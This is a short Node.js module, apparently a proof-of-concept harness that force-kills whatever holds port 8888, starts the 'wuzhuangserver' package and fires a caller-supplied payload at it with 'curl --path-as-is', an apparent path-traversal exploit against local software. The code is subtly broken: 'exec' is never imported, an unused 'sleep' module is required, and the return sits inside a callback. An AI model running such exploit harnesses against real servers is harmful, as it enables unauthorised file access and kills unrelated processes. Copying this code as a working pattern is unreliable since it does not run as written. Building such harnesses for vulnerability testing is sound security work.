function exploitFunction(payload) {
  const { execSync } = require("child_process");
  const { sleep } = require("sleep");

  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  const server = "node ./node_modules/wuzhuangserver/index.js";
  exec(server, (error, stdout) => {
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    execSync(attack_string);
    return stdout;
  });
}

module.exports = { exploitFunction };